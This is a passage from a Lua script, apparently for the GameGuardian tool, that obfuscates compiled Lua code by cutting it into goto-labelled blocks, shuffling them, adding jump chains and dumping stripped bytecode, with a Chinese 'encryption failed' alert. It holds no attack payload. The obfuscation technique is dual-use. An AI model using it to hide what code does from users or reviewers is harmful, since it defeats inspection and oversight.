    end):gsub("\n%s*(; .end local v[^\n]+)",function(x)
        return x
    end)
    :gsub("\n%s+","\n")
    Tran = Tran:gsub("maxstacksize (%d+)(.-RETURN[^\nv]+)\n",function(max,str)
        if str:find("TFORCALL") == nil then
            local tre_S = {}
            local tre_C = {}
            local num = 1000000
            str = str:gsub("[^\n]+",function(s)
                zl = s:match("%S+")
                if zl == ".upval" or zl == ".line" then
                    tre_C[#tre_C+1] = s
                elseif zl == "RETURN" then
                    if s:find("v") then
                        tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                        num = num+1
                    else
                        tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s
                        num = num+1
                    end
                elseif zl:find("goto_") then
                    tre_S[#tre_S+1] = s .. "\n" .. "JMP :goto_" .. num .. Resver()
                elseif zl == "JMP" then
                    if tre_S[1] then
                        tre_S[#tre_S] = tre_S[#tre_S]:gsub("(.+)(JMP[^\n]+)",function(zz,o)
                            return zz .. s .. "\n" .. o
                    end)
                    else
                        tre_C[#tre_C+1] = s
                    end
                else
                    tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                    num = num+1
                end
            end)
            tre_S = Tab.Table_Rand(tre_S)
            for i,k in pairs(tre_C) do
                table.insert(tre_S,i,k)
            end
            table.insert(tre_S,#tre_C+1,"JMP :goto_1000000")
            tre_S = table.concat(tre_S,"\n")
            return "maxstacksize "..math.random(190,230).."\n" .. tre_S:gsub("\n%s+","\n") .. "\n"
        else
            local tre_Z = {}
            local num = 1000000
            local tre_X = {}
            local tre_V = {}
            str = str:gsub("[^\n]+",function(s)
                zl = s:match("%S+")
                local Dt,tD,DT = nil, nil, nil
                if zl == ".upval" or zl == ".line" then
                    tre_Z[#tre_Z+1] = s
                    tD = true
                end

                if ZL[zl] then
                    num = num+1
                    if zl == "RETURN" and s:find("v") == nil then
                        tre_X[#tre_X+1] = ":goto_" .. num .. "\n" .. s
                        DT=true
                    else
                        tre_X[#tre_X+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                        num = num+1
                        Dt = true
                    end
                end
                if Dt then
                    return "JMP :goto_" .. (num-1) .. "\n:goto_" .. num
                elseif tD then
                    return ""
                elseif DT then
                    return "JMP :goto_" .. num
                else
                    return s
                end
            end)
            tre_X = Tab.Table_Rand(tre_X)
            tre_V = Tab.Table_Rand(tre_V)
            tre_Z = table.concat(tre_Z,"\n")
            tre_X = table.concat(tre_X,"\n")
            tre_V = table.concat(tre_V,"\n")
            return "maxstacksize "..max.."\n" .. tre_Z .. "\nJMP :goto_1000000\n" .. tre_X .. "\n:goto_1000000\n" .. str .. "\n" .. tre_V .. "\n"
        end
    end)
    Tran = Tran:gsub("; .local v%d+%s*\"%(.-%)\"",function(x)
        return x .. "\n"
    end):gsub("; .end local v%d+%s*\"%(.-%)\"",function(x)
        return "\n" .. x
    end):gsub("\n%s+","\n")
    return Tran
end
gr=Disloc(gr,1)
File_operations(last,gr)
local rg=load(gr)
if not rg then
    os.exit(gg.alert("『加密失败』"))
end
gr=string.dump(rg,true)
File_operations(last,gr)
gg.setVisible(true)